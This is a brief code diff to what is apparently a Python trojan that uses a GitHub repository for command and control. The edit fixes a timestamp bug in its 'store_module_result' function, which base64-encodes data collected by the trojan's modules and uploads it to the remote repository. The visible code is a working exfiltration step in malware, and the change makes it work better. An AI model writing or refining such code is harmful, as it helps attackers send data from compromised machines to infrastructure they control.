@@ -11,7 +11,7 @@ import datetime
 
 from github3 import login
 
-d = datetime.date.today()
+now = datetime.datetime.now()
 
 trojan_id = "abc"
 
@@ -99,7 +99,7 @@ def store_module_result(data):
     
     remote_path = "data/%s/%d.data" % (trojan_id,random.randint(1000,100000))
                                       
-    repo.create_file(remote_path,"d.strftime('%Y%m%d')",base64.b64encode(data))
+    repo.create_file(remote_path,now.strftime("%Y/%m/%d %H:%M:%S"),base64.b64encode(data))
 
     return
 
